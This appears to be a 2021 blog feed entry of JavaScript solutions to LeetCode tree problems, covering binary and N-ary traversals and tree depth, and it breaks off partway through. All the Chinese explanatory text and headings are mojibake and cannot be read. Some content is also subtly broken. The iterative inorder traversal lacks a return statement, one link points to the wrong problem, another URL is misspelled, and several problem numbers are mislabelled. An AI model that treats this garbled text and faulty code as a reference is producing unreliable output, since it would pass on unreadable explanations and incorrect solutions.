    <link href="http://example.com/2021/06/11/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>http://example.com/2021/06/11/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2021-06-11T19:42:29.000Z</published>
    <updated>2021-08-21T09:40:56.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LeetCode144â€”â€”äºŒå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰"><a href="#LeetCode144â€”â€”äºŒå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode144â€”â€”äºŒå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰"></a>LeetCode144â€”â€”äºŒå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç "><a href="#è‡ªå·±çš„ä»£ç " class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>çŸ¥é“äºŒå‰æ ‘çš„å‰åºéå†ï¼Œä½†æ˜¯ç¬¬ä¸€æ¬¡å®ç°æ˜¯çœŸä¸ä¼šå•Šã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£"><a href="#æ€è·¯1-amp-é¢˜è§£" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><ol><li>ç¡®å®šé€’å½’å‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼ã€‚</li><li>ç¡®å®šç»ˆæ­¢æ¡ä»¶ã€‚å¦‚æœå½“å‰éå†çš„èŠ‚ç‚¹æ˜¯ç©ºï¼Œé‚£ä¹ˆæœ¬å±‚é€’å½’ç»“æŸã€‚</li><li>ç¡®å®šå•å±‚é€’å½’çš„é€»è¾‘ã€‚å‰åºéå†æ˜¯ä¸­å·¦å³çš„å¾ªåºï¼Œæ‰€ä»¥è¦å…ˆå–ä¸­èŠ‚ç‚¹çš„æ•°å€¼ã€‚</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> preorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root,res=[]</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (!root) <span class="keyword">return</span> res</span><br><span class="line">     res.push(root.val) <span class="comment">// ä¸­</span></span><br><span class="line">     preorderTraversal(root.left, res) <span class="comment">// å·¦</span></span><br><span class="line">     preorderTraversal(root.right, res) <span class="comment">// å³</span></span><br><span class="line">     <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ€è·¯2-amp-é¢˜è§£"><a href="#æ€è·¯2-amp-é¢˜è§£" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h2><p>è¿­ä»£ï¼š</p><p>å‰åºéå†æ˜¯ä¸­å·¦å³ï¼Œæ¯æ¬¡å…ˆå¤„ç†çš„æ˜¯ä¸­é—´èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå…ˆå°†è·ŸèŠ‚ç‚¹æ”¾å…¥æ ˆä¸­ï¼Œç„¶åå°†å³å­©å­åŠ å…¥æ ˆï¼Œå†åŠ å…¥å·¦å­©å­ã€‚è¿™æ ·å‡ºæ ˆçš„æ—¶å€™å°±æ˜¯ä¸­å·¦å³çš„é¡ºåºã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…¥æ ˆ å³ -&gt; å·¦</span></span><br><span class="line"><span class="comment">// å‡ºæ ˆ ä¸­ -&gt; å·¦ -&gt; å³</span></span><br><span class="line"><span class="keyword">var</span> preorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">const</span> stack = [root];</span><br><span class="line">    <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(stack.length) &#123;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        res.push(cur.val);</span><br><span class="line">        cur.right &amp;&amp; stack.push(cur.right);</span><br><span class="line">        cur.left &amp;&amp; stack.push(cur.left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><h2 id="LeetCode94â€”â€”äºŒå‰æ ‘çš„ä¸­åºéå†ï¼ˆâ˜†ï¼‰"><a href="#LeetCode94â€”â€”äºŒå‰æ ‘çš„ä¸­åºéå†ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode94â€”â€”äºŒå‰æ ‘çš„ä¸­åºéå†ï¼ˆâ˜†ï¼‰"></a>LeetCode94â€”â€”äºŒå‰æ ‘çš„ä¸­åºéå†ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -1"><a href="#è‡ªå·±çš„ä»£ç -1" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>çŸ¥é“å‰åºéå†åï¼Œä¸­åºï¼ˆå·¦æ ¹å³ï¼‰ï¼Œååºï¼ˆå·¦å³æ ¹ï¼‰å°±å¾ˆç®€å•ï¼šï¼ˆé€’å½’ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">    inorderTraversal(root.left, res); </span><br><span class="line">    res.push(root.val)</span><br><span class="line">    inorderTraversal(root.right, res);</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ"><a href="#å¤æ‚åº¦åˆ†æ" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li><p>æ—¶é—´å¤æ‚åº¦ï¼šO(n)ï¼Œå…¶ä¸­ n ä¸ºäºŒå‰æ ‘èŠ‚ç‚¹çš„ä¸ªæ•°ã€‚äºŒå‰æ ‘çš„éå†ä¸­æ¯ä¸ªèŠ‚ç‚¹ä¼šè¢«è®¿é—®ä¸€æ¬¡ä¸”åªä¼šè¢«è®¿é—®ä¸€æ¬¡ã€‚</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼šO(n)ã€‚ç©ºé—´å¤æ‚åº¦å–å†³äºé€’å½’çš„æ ˆæ·±åº¦ï¼Œè€Œæ ˆæ·±åº¦åœ¨äºŒå‰æ ‘ä¸ºä¸€æ¡é“¾çš„æƒ…å†µä¸‹ä¼šè¾¾åˆ° O(n) çš„çº§åˆ«ã€‚</p></li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£-1"><a href="#æ€è·¯2-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><p>é€’å½’çš„æ—¶å€™éšå¼åœ°ç»´æŠ¤äº†ä¸€ä¸ªæ ˆï¼Œè€Œè¿­ä»£çš„æ—¶å€™éœ€è¦æ˜¾å¼åœ°å°†è¿™ä¸ªæ ˆæ¨¡æ‹Ÿå‡ºæ¥ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> stack = [];</span><br><span class="line">    <span class="keyword">let</span> cur = root;</span><br><span class="line">    <span class="keyword">while</span> (stack.length || cur) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur) &#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            <span class="comment">// éå†åˆ°å·¦è¾¹æœ€æ·±å¤„</span></span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            res.push(cur.val);</span><br><span class="line">            <span class="comment">// åˆ¤æ–­å³èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨åˆ™ç»§ç»­å¾€ä¸Špopï¼Œç›´åˆ°ä¸­é—´èŠ‚ç‚¹ï¼Œç„¶åæ”¾å…¥å³èŠ‚ç‚¹</span></span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-1"><a href="#å¤æ‚åº¦åˆ†æ-1" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><p>åŒ1</p><h2 id="LeetCode145â€”â€”äºŒå‰æ ‘çš„ååºéå†ï¼ˆâ˜†ï¼‰"><a href="#LeetCode145â€”â€”äºŒå‰æ ‘çš„ååºéå†ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode145â€”â€”äºŒå‰æ ‘çš„ååºéå†ï¼ˆâ˜†ï¼‰"></a>LeetCode145â€”â€”äºŒå‰æ ‘çš„ååºéå†ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -2"><a href="#è‡ªå·±çš„ä»£ç -2" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>é€’å½’ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> postorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">    postorderTraversal(root.left, res); </span><br><span class="line">    postorderTraversal(root.right, res);</span><br><span class="line">    res.push(root.val)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><p>è¿­ä»£ï¼šå…ˆåºéå†æ˜¯ä¸­å·¦å³ï¼Œåç»­éå†æ˜¯å·¦å³ä¸­ã€‚å› æ­¤åªéœ€è°ƒæ•´ä¸€ä¸‹å…ˆåºéå†çš„ä»£ç é¡ºåºï¼Œå˜æˆä¸­å³å·¦ï¼Œå†åè½¬resæ•°ç»„ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…¥æ ˆ å·¦ -&gt; å³</span></span><br><span class="line"><span class="comment">// å‡ºæ ˆ ä¸­ -&gt; å³ -&gt; å·¦ ç»“æœç¿»è½¬</span></span><br><span class="line"><span class="keyword">var</span> postorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">const</span> stack = [root];</span><br><span class="line">    <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(stack.length) &#123;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        res.push(cur.val);</span><br><span class="line">        cur.left &amp;&amp; stack.push(cur.left);</span><br><span class="line">        cur.right &amp;&amp; stack.push(cur.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.reverse();</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><h2 id="LeetCode102â€”â€”äºŒå‰æ ‘çš„å±‚åºéå†ï¼ˆâ˜†â˜†ï¼‰ï¼ˆé«˜é¢‘ï¼‰"><a href="#LeetCode102â€”â€”äºŒå‰æ ‘çš„å±‚åºéå†ï¼ˆâ˜†â˜†ï¼‰ï¼ˆé«˜é¢‘ï¼‰" class="headerlink" title="LeetCode102â€”â€”äºŒå‰æ ‘çš„å±‚åºéå†ï¼ˆâ˜†â˜†ï¼‰ï¼ˆé«˜é¢‘ï¼‰"></a>LeetCode102â€”â€”äºŒå‰æ ‘çš„å±‚åºéå†ï¼ˆâ˜†â˜†ï¼‰ï¼ˆé«˜é¢‘ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-lever-order-traversal/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -3"><a href="#è‡ªå·±çš„ä»£ç -3" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>è‡ªå·±ç¬¬ä¸€æ¬¡å†™è¿˜æ˜¯å†™ä¸å‡ºæ¥</p><h3 id="æ€è·¯1-amp-é¢˜è§£-1"><a href="#æ€è·¯1-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>BFSï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> levelOrder = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> [];</span><br><span class="line">    <span class="keyword">let</span> res = [], queue = [root];</span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="comment">// è®°å½•å½“å‰å±‚èŠ‚ç‚¹æ•°</span></span><br><span class="line">        <span class="keyword">let</span> length = queue.length;</span><br><span class="line">        <span class="comment">// å­˜æ”¾æ¯ä¸€å±‚èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">let</span> curLevel = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">            <span class="keyword">let</span> node = queue.shift();</span><br><span class="line">            curLevel.push(node.val);</span><br><span class="line">            <span class="comment">// å­˜æ”¾å½“å‰å±‚ä¸‹ä¸€å±‚çš„èŠ‚ç‚¹</span></span><br><span class="line">            node.left &amp;&amp; queue.push(node.left);</span><br><span class="line">            node.right &amp;&amp; queue.push(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æŠŠæ¯å±‚ç»“æœæ”¾åˆ°res</span></span><br><span class="line">        res.push(curLevel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-2"><a href="#æ€è·¯2-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>DFSï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> levelOrder = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="keyword">var</span> level = <span class="number">0</span>;</span><br><span class="line">    traverse(root, level);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">traverse</span>(<span class="params">root, level</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (level &gt;= result.length) &#123;</span><br><span class="line">            result[level] = [];</span><br><span class="line">        &#125;</span><br><span class="line">        result[level].push(root.val);</span><br><span class="line">        traverse(root.left, level + <span class="number">1</span>);</span><br><span class="line">        traverse(root.right, level + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode589â€”â€”Nå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰"><a href="#LeetCode589â€”â€”Nå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode589â€”â€”Nå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰"></a>LeetCode589â€”â€”Nå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/n-ary-tree-postorder-traversal/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯1-amp-é¢˜è§£-2"><a href="#æ€è·¯1-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> preorder = <span class="function"><span class="keyword">function</span>(<span class="params">root, ans=[]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> ans</span><br><span class="line">    ans.push(root.val)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> child <span class="keyword">of</span> root.children)</span><br><span class="line">        preorder(child, ans)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-3"><a href="#æ€è·¯2-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> preorder = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">  <span class="keyword">let</span> stack = [root];</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">while</span>(stack.length)&#123;</span><br><span class="line">    cur = stack.pop();</span><br><span class="line">    res.push(cur.val);</span><br><span class="line">    <span class="keyword">if</span> (cur.children) &#123;</span><br><span class="line">      cur.children.reverse();</span><br><span class="line">      stack.push(...cur.children);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if å¯æ›¿æ¢ä¸ºï¼š</span></span><br><span class="line">    <span class="comment">// for(let i = node.children.length - 1; i &gt;= 0; i--) &#123;</span></span><br><span class="line">    <span class="comment">//     stack.push(node.children[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode145â€”â€”Nå‰æ ‘çš„ååºéå†ï¼ˆâ˜†ï¼‰"><a href="#LeetCode145â€”â€”Nå‰æ ‘çš„ååºéå†ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode145â€”â€”Nå‰æ ‘çš„ååºéå†ï¼ˆâ˜†ï¼‰"></a>LeetCode145â€”â€”Nå‰æ ‘çš„ååºéå†ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/n-ary-tree-postorder-traversal/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯1-amp-é¢˜è§£-3"><a href="#æ€è·¯1-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> postorder = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">order</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node.children) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; node.children.length; i++)&#123;</span><br><span class="line">        order(node.children[i]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// or  for(child of node.children)&#123;...&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.push(node.val);</span><br><span class="line">  &#125;</span><br><span class="line">  order(root);</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-4"><a href="#æ€è·¯2-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> postorder = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">  <span class="keyword">let</span> stack = [root];</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">while</span>(stack.length)&#123;</span><br><span class="line">    cur = stack.pop();</span><br><span class="line">    <span class="keyword">if</span>(cur.children)&#123;</span><br><span class="line">      stack.push(...cur.children);</span><br><span class="line">    &#125;</span><br><span class="line">    res.push(cur.val);<span class="comment">//å› ä¸ºæ˜¯ååºéå†ï¼Œæ‰€ä»¥è¦æŠŠæ¯æ¬¡å¼¹å‡ºçš„å€¼å‹æ”¾å…¥æ ˆåº•</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.reverse();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode429â€”â€”Nå‰æ ‘çš„å±‚åºéå†ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode429â€”â€”Nå‰æ ‘çš„å±‚åºéå†ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode429â€”â€”Nå‰æ ‘çš„å±‚åºéå†ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode429â€”â€”Nå‰æ ‘çš„å±‚åºéå†ï¼ˆâ˜†â˜†ï¼‰</h2><h3 id="æ€è·¯-amp-é¢˜è§£"><a href="#æ€è·¯-amp-é¢˜è§£" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> levelOrder = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [], queue = [];</span><br><span class="line">  queue.push(root);</span><br><span class="line">  <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">  <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">      <span class="keyword">let</span> length = queue.length;</span><br><span class="line">      <span class="keyword">let</span> curLevel = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">          <span class="keyword">let</span> node = queue.shift();</span><br><span class="line">          curLevel.push(node.val);</span><br><span class="line">          node.children &amp;&amp; queue.push(...node.children);</span><br><span class="line">      &#125;</span><br><span class="line">      res.push(curLevel);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode104â€”â€”äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦ï¼ˆâ˜†ï¼‰"><a href="#LeetCode104â€”â€”äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode104â€”â€”äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦ï¼ˆâ˜†ï¼‰"></a>LeetCode104â€”â€”äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -4"><a href="#è‡ªå·±çš„ä»£ç -4" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>äºŒå‰æ ‘çš„é¢˜ç›®è¿˜æ˜¯å¾ˆä¸ç†Ÿç»ƒï¼Œè¿™ä¹ˆç®€å•çš„é¢˜ç›®éƒ½ä¸ä¼šå†™ã€‚ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-4"><a href="#æ€è·¯1-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> left = maxDepth(root.left);</span><br><span class="line">    <span class="keyword">const</span> right = maxDepth(root.right);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(left, right) + <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç²¾ç®€ç‰ˆ</span></span><br><span class="line"><span class="keyword">var</span> maxDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">Math</span>.max(maxDepth(root.left), maxDepth(root.right))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å†æ¬¡å¼ºè°ƒ<strong>é€’å½’ä¸‰éƒ¨æ›²</strong>ï¼š</p><ol><li>ç¡®å®šé€’å½’å‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼ï¼šå‚æ•°å°±æ˜¯ä¼ å…¥æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œè¿”å›å°±è¿”å›è¿™æ£µæ ‘çš„æ·±åº¦ã€‚</li><li>ç¡®å®šç»ˆæ­¢æ¡ä»¶ï¼šå¦‚æœä¸ºç©ºèŠ‚ç‚¹çš„è¯ï¼Œå°±è¿”å›0ï¼Œè¡¨ç¤ºé«˜åº¦ä¸º0ã€‚</li><li>ç¡®å®šå•å±‚é€’å½’çš„é€»è¾‘ï¼šå…ˆæ±‚å®ƒçš„å·¦å­æ ‘çš„æ·±åº¦ï¼Œå†æ±‚çš„å³å­æ ‘çš„æ·±åº¦ï¼Œæœ€åå–å·¦å³æ·±åº¦æœ€å¤§çš„æ•°å€¼ å†+1 ï¼ˆåŠ 1æ˜¯å› ä¸ºç®—ä¸Šå½“å‰ä¸­é—´èŠ‚ç‚¹ï¼‰å°±æ˜¯ç›®å‰èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„æ ‘çš„æ·±åº¦ã€‚</li></ol><h3 id="æ€è·¯2-amp-é¢˜è§£-5"><a href="#æ€è·¯2-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><p>ä½¿ç”¨å±‚åºéå†ï¼Œæœ€å¤§çš„æ·±åº¦å°±æ˜¯äºŒå‰æ ‘çš„å±‚æ•°ã€‚</p><p>ä»£ç è§ä¸Šï¼ˆ LC102 äºŒå‰æ ‘çš„å±‚åºéå†ï¼‰</p><h2 id="LeetCode104â€”â€”äºŒå‰æ ‘çš„æœ€å°æ·±åº¦ï¼ˆâ˜†ï¼‰"><a href="#LeetCode104â€”â€”äºŒå‰æ ‘çš„æœ€å°æ·±åº¦ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode104â€”â€”äºŒå‰æ ‘çš„æœ€å°æ·±åº¦ï¼ˆâ˜†ï¼‰"></a>LeetCode104â€”â€”äºŒå‰æ ‘çš„æœ€å°æ·±åº¦ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/minimum-depth-of-binary-tree/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯1-amp-é¢˜è§£-5"><a href="#æ€è·¯1-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> left = minDepth(root.left);</span><br><span class="line">    <span class="keyword">const</span> right = minDepth(root.right);</span><br><span class="line">    <span class="comment">// æ³¨æ„ â€œå¶å­ç»“ç‚¹â€å³å·¦å³å­æ 